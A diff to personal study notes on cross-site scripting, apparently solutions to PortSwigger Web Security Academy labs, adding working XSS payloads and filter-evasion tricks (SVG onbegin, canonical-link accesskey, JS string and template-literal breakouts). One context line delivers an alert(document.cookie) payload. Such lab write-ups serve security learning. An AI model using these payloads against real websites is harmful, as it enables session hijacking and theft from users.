@@ -1,6 +1,9 @@
 Ania Pirogowicz
 # XSS
 
+- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+- https://portswigger.net/web-security/cross-site-scripting/contexts
+
 ## Reflected XSS into HTML context with nothing encoded
 
 ```
@@ -148,4 +151,67 @@ Deliver body:
 <script>
     location = "https://0a66005c0464b19d8b41541a007d004d.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocusin%3Dalert%28document.cookie%29+style%3D%22display%3A+block%22%3Ea%3C%2Fxss%3E"
 </script>
+```
+
+## Reflected XSS with some SVG markup allowed
+
+Fuzz all posiible tags, to test which one could be used. `<svg>`, `<animatetransform>`, `<title>`, `<image>` are accepted.
+
+Fuzz all possible events for `<svg><animatetransform>`. `onbegin` is accepted.
+
+Payload
+```
+<svg><animatetransform onbegin=alert(1) attributeName=transform>
+```
+
+## Reflected XSS in canonical link tag
+
+On adding `?'accesskey='x'onclick='alert(1)` to the URL, the canonical link reflects this change:
+```
+<link rel="canonical" href='https://0a4c00fe04e52b82813cdf9400c1005e.web-security-academy.net/?'accesskey='x'onclick='alert(1)'/>
+```
+
+This will cause to trigger `onclick` event on `Chrome` when shortcut are applied:
+ - On Windows: `ALT+SHIFT+X`
+ - On MacOS: `CTRL+ALT+X`
+ - On Linux: `Alt+X`
+
+## Reflected XSS into a JavaScript string with single quote and backslash escaped
+
+Entering `</script>` breaks the original `<script>` tag.
+
+Final payload:
+```
+</script><script>alert(document.domain)</script>
+```
+
+## Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+
+`\` are not escaped, but `'` are. So injecting `\'` turns into `\\'` which lets us escape the sctring in `<script>` context
+
+```
+\';alert(1)//
+```
+
+## Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+
+When the browser has parsed out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any further.
+
+Content of onclick event is URL decoded on run, so string can be scaped using `&apos;`
+
+```
+http://JKDSFKDSF_WEBSITE&apos;); alert(1); //
+```
+
+## Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+
+Check what values are geting encoded:
+```
+JKSDFHSUD_SEARCH { } $ & - / \ ' " - +
+```
+
+`${2+2}` results in `4` because the injected payload is in js string template.
+
+```
+${alert(1)}
 ```
